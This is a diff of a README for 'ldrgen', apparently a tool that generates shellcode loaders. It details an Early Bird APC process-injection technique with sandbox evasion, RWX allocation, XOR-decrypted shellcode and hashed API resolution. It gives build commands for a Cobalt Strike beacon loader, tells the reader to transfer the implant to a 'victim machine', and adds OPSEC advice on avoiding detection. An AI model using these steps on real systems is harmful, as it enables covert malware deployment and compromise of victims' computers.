@@ -55,24 +55,18 @@ The following examples will use the loader token `EarlyBirdAPC_Buffed` which use
 
 > ✅ All WinAPI function calls are dynamically resolved at runtime from a calculated hash unless otherwise stated, see [hash.py](./templates/Scripts/hash.py) for more information on the hashing algorithm.
 
-* Attempts sandbox evasion by counting to `10000000000`, takes roughly ~30-45 seconds to complete.
-* Runtime dynamic resolution of WinAPIs from `kernel32.dll` 
-* Spawns user controlled process in suspended state - denoted by `${ PNAME }`
-    - Uses `CreateProcessW` resolved from `kernel32.dll` 
-    - See: [EarlyBirdAPC_Buffed.c - Line 213](./templates/Source/EarlyBirdAPC_Buffed.c#L213)
-* Allocates memory in the suspended process with the size of the shellcode
-    - Uses `VirtualAllocEx` resolved from `kernel32.dll` to allocate PAGE_EXECUTE_READWRITE (RWX) memory of the size of the shellcode - denoted by `${ SHELLCODE_SIZE }`
-    - See: [Shellcode.c - Line 3](./templates/Source/Shellcode.c#L3)
-* Begins a routine to XOR decrypt the shellcode in memory with a user-defined key - denoted by `${ KEY }`
-    - See [EarlyBirdAPC_Buffed.c - Line 236](./templates/Source/EarlyBirdAPC_Buffed.c#236)
-    - Uses an XOR function from [Xor.c](./templates/Source/Xor.c) to decrypt the shellcode in memory
+#### Early Bird APC via CreateProcessW & QueueUserAPC
+| Step | Action | Details | Source |
+|------|--------|---------|--------|
+| 1 | Sandbox Evasion | Counts to `10000000000`, taking ~30-45 seconds. | [EarlyBirdAPC_Buffed.c](./templates/Source/EarlyBirdAPC_Buffed.c) |
+| 2 | API Resolution | Dynamically resolves WinAPIs from `kernel32.dll`. | |
+| 3 | Process Creation | Spawns a process (`${ PNAME }`) in a suspended state using `CreateProcessW`. | [EarlyBirdAPC_Buffed.c - Line 213](./templates/Source/EarlyBirdAPC_Buffed.c#L213) |
+| 4 | Memory Allocation | Allocates RWX memory in the suspended process with `VirtualAllocEx`, size: `${ SHELLCODE_SIZE }`. | [Shellcode.c - Line 3](./templates/Source/Shellcode.c#L3) |
+| 5 | Shellcode Decryption | XOR decrypts the shellcode in memory with key `${ KEY }`. Uses `Xor.c` for decryption. | [EarlyBirdAPC_Buffed.c - Line 236](./templates/Source/EarlyBirdAPC_Buffed.c#236) |
+| 6 | Write Shellcode | Writes the shellcode buffer to the allocated memory using `WriteProcessMemory`. | [Shellcode.c - Line 2](./templates/Source/Shellcode.c#L2) |
+| 7 | Queue APC | Queues an APC to the suspended thread, resumes it, and waits for process exit with `WaitForSingleObject`. | |
+| 8 | Cleanup | Cleans up allocated memory and closes handles. | |
 
-* Writes the shellcode buffer to the allocated memory
-    - Uses `WriteProcessMemory` resolved from `kernel32.dll` to write the shellcode to the allocated memory - denoted by `${ SHELLCODE }`
-    - See: [Shellcode.c - Line 2](./templates/Source/Shellcode.c#L2)
-
-* Queues an APC to the suspended thread, resumes the thread and waits for process to exit via `WaitForSingleObject`
-* Cleans up the allocated memory, and closes handles, before dying gracefully.
 
 #### Cobalt Strike Beacon
 The following is usage of ldrgen to generate a loader for Cobalt Strike's beacon using the `EarlyBirdAPC_Buffed` token.
@@ -86,30 +80,30 @@ The following is usage of ldrgen to generate a loader for Cobalt Strike's beacon
     ![cobalt_example_1](./assets/cobalt_example_1.png)
 
 2. Generate the loader
-```bash
-ldrgen-linux-x64 generate --template ../../templates --bin payload_x64.bin --output implants --loader EarlyBirdAPC_Buffed --enc xor --args "key=2adc118cdd0ae, pname=C:\\\Windows\\\system32\\\cmd.exe"     
+    ```bash
+    ldrgen-linux-x64 generate --template ../../templates --bin payload_x64.bin --output implants --loader EarlyBirdAPC_Buffed --enc xor --args "key=2adc118cdd0ae, pname=C:\\\Windows\\\system32\\\cmd.exe"     
 
-Loader          ->    EarlyBirdAPC_Buffed
-Encoding Type   ->    xor
-Key:            ->    2adc118cdd0ae
-Process Name    ->    C:\\Windows\\system32\\cmd.exe
-```
-![cobalt_example_2](./assets/cobalt_example_2.png)
+    Loader          ->    EarlyBirdAPC_Buffed
+    Encoding Type   ->    xor
+    Key:            ->    2adc118cdd0ae
+    Process Name    ->    C:\\Windows\\system32\\cmd.exe
+    ```
+    ![cobalt_example_2](./assets/cobalt_example_2.png)
 
 3. Compile the loader
-```bash
-cd implants && make x64
-```
+    ```bash
+    cd implants && make x64
+    ```
 
-![cobalt_example_3](./assets/cobalt_example_3.png)
+    ![cobalt_example_3](./assets/cobalt_example_3.png)
 
 4. Transfer implant to victim machine, and execute the loader.
 
-![cobalt_example_4](./assets/cobalt_example_4.png)
+    ![cobalt_example_4](./assets/cobalt_example_4.png)
 
 5. Check that beacon callback was successful.
 
-![cobalt_example_5](./assets/cobalt_example_5.png)
+    ![cobalt_example_5](./assets/cobalt_example_5.png)
 
 > ⚠️ OPSEC Note: The beacon used and generated has **no in memory evasion** and will 100% be killed if you trigger a memory scan or perform any OPSEC unsafe actions.
 
